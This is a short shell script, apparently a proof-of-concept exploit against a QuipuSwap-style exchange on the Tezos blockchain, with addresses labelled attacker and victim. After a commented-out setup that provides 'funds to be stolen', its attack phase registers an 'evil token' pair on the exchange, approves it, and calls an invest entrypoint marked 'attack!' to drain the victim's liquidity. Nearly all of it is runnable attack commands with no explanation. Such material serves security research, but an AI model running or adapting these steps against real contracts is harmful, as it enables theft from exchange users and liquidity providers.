#!/bin/sh

attacker=KT1HfhHnP1cp7Jor47Sihh5agxU2N2mffSzw
victim=KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr
quipuswap=KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ

### initial investment phase. Provide some funds to be stolen ###
# allow quipu to spend my account token_a

# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr --entrypoint 'update_operators' --arg '{ Left (Pair "tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw"  (Pair "KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ" 0)) }' --burn-cap 0.2

# # allow quipu to spend my account token_b
# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7 --entrypoint 'update_operators' --arg '{ Left (Pair "tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw"  (Pair "KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ" 0)) }' --burn-cap 0.2

# # initialize good exchange
# tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ --entrypoint 'initializeExchange' --arg 'Pair (Pair (Pair (Pair "KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr" 0) (Pair (Right Unit) "KT1VCczKAoRQJKco7NiSaB93PMkYCbL2z1K7")) (Pair 0 (Right Unit))) (Pair 200 200)' --burn-cap 0.2

### attack phase ###

# deploy evil token pair to Quipu
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1BuxM5qtgw9zJ94nekJE7FMaCKBTxjPZrQ --entrypoint 'initializeExchange' --arg 'Pair (Pair (Pair (Pair "KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr" 0) (Pair (Right Unit) "KT1HfhHnP1cp7Jor47Sihh5agxU2N2mffSzw")) (Pair 0 (Right Unit))) (Pair 200 200)' --burn-cap 0.2

# allow evil token to be spent on quipu
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1HfhHnP1cp7Jor47Sihh5agxU2N2mffSzw --entrypoint 'allow' --arg '"KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr"' --burn-cap 0.2

# attack!
tezos-client transfer 0 from tz1MDhGTfMQjtMYFXeasKzRWzkQKPtXEkSEw to KT1HfhHnP1cp7Jor47Sihh5agxU2N2mffSzw --entrypoint 'invest' --arg 'Pair (Pair 95 95) (Pair 95 "KT191vxSsFD18yGdJAzgwbPVUPrdPUzcyFNr")' --burn-cap 0.2
